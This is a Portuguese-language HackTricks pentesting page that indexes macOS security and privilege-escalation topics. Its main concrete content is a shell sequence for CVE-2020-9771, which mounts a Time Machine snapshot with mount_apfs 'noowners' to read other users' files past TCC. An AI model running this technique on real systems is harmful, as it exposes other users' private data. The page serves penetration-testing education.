# Segurança e Escalada de Privilégios no macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novos programas de recompensas por bugs

💬 Participe de discussões na comunidade

## MacOS Básico

Se você não está familiarizado com o macOS, você deve começar aprendendo os conceitos básicos do macOS:&#x20;

* Arquivos e permissões especiais do macOS:

{% content-ref url="macos-files-folders-and-binaries/" %}
[macos-files-folders-and-binaries](macos-files-folders-and-binaries/)
{% endcontent-ref %}

* Usuários comuns do macOS

{% content-ref url="macos-users.md" %}
[macos-users.md](macos-users.md)
{% endcontent-ref %}

* **AppleFS**

{% content-ref url="macos-applefs.md" %}
[macos-applefs.md](macos-applefs.md)
{% endcontent-ref %}

* A **arquitetura** do **kernel**

{% content-ref url="mac-os-architecture/" %}
[mac-os-architecture](mac-os-architecture/)
{% endcontent-ref %}

* Serviços e protocolos de rede comuns do macOS

{% content-ref url="macos-protocols.md" %}
[macos-protocols.md](macos-protocols.md)
{% endcontent-ref %}

### MacOS MDM

Em empresas, os sistemas **macOS** são altamente prováveis de serem **gerenciados com um MDM**. Portanto, do ponto de vista de um atacante, é interessante saber **como isso funciona**:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### MacOS - Inspeção, Depuração e Fuzzing

{% content-ref url="macos-apps-inspecting-debugging-and-fuzzing/" %}
[macos-apps-inspecting-debugging-and-fuzzing](macos-apps-inspecting-debugging-and-fuzzing/)
{% endcontent-ref %}

## Proteções de Segurança do MacOS

{% content-ref url="macos-security-protections/" %}
[macos-security-protections](macos-security-protections/)
{% endcontent-ref %}

## Superfície de Ataque

### Permissões de Arquivo

Se um **processo em execução como root escreve** um arquivo que pode ser controlado por um usuário, o usuário pode abusar disso para **escalar privilégios**.\
Isso pode ocorrer nas seguintes situações:

* O arquivo usado já foi criado por um usuário (propriedade do usuário)
* O arquivo usado é gravável pelo usuário por causa de um grupo
* O arquivo usado está dentro de um diretório de propriedade do usuário (o usuário pode criar o arquivo)
* O arquivo usado está dentro de um diretório de propriedade do root, mas o usuário tem acesso de gravação sobre ele por causa de um grupo (o usuário pode criar o arquivo)

Ser capaz de **criar um arquivo** que será **usado pelo root**, permite que um usuário **aproveite seu conteúdo** ou até mesmo crie **symlinks/hardlinks** para apontá-lo para outro lugar.

Para esse tipo de vulnerabilidades, não se esqueça de **verificar instaladores `.pkg` vulneráveis**:

{% content-ref url="macos-files-folders-and-binaries/macos-installer-packages-pkg.md" %}
[macos-installer-packages-pkg.md](macos-files-folders-and-binaries/macos-installer-packages-pkg.md)
{% endcontent-ref %}

### Abuso de Privilégios e Entitlements via Abuso de Processo

Se um processo pode **injetar código em outro processo com melhores privilégios ou entitlements** ou contatá-lo para realizar ações de privilégios, ele pode escalar privilégios e contornar medidas defensivas como [Sandbox](macos-security-protections/macos-sandbox/) ou [TCC](macos-security-protections/macos-tcc/).

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

### Aplicativos de Extensão de Arquivo

Aplicativos estranhos registrados por extensões de arquivo podem ser abusados:

{% content-ref url="macos-file-extension-apps.md" %}
[macos-file-extension-apps.md](macos-file-extension-apps.md)
{% endcontent-ref %}

### Aplicativos de Manipulador de URL

Diferentes aplicativos podem ser registrados para abrir protocolos específicos. Eles podem ser abusados.

TODO: Criar uma página sobre isso

## Escalada de Privilégios no MacOS

### CVE-2020-9771 - mount\_apfs TCC bypass e escalada de privilégios

**Qualquer usuário** (mesmo não privilegiado) pode criar e montar um snapshot do time machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é para o aplicativo usado (como o `Terminal`) ter **Acesso Total ao Disco** (FDA) (`kTCCServiceSystemPolicyAllfiles`) que precisa ser concedido por um administrador.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### Informações Sensíveis

{% content-ref url="macos-files-folders-and-binaries/macos-sensitive-locations.md" %}
[macos-sensitive-locations.md](macos-files-folders-and-binaries/macos-sensitive-locations.md)
{% endcontent-ref %}

### Linux Privesc

Em primeiro lugar, observe que **a maioria dos truques de escalonamento de privilégios que afetam o Linux/Unix também afetarão as máquinas MacOS**. Então veja:

{% content-ref url="../../linux-hardening/privilege-escalation/" %}
[privilege-escalation](../../linux-hardening/privilege-escalation/)
{% endcontent-ref %}

## Referências

* [**OS X Incident Response: Scripting and Analysis**](https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS)
* [**https://taomm.org/vol1/analysis.html**](https://taomm.org/vol1/analysis.html)
* [**https://github.com/NicolasGrimonpont/Cheatsheet**](https://github.com/NicolasGrimonpont/Cheatsheet)
* [**https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ**](https://assets.sentinelone.com/c/sentinal-one-mac-os-?x=FvGtLJ)
* [**https://www.youtube.com/watch?v=vMGiplQtjTY**](https://www.youtube.com/watch?v=vMGiplQtjTY)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
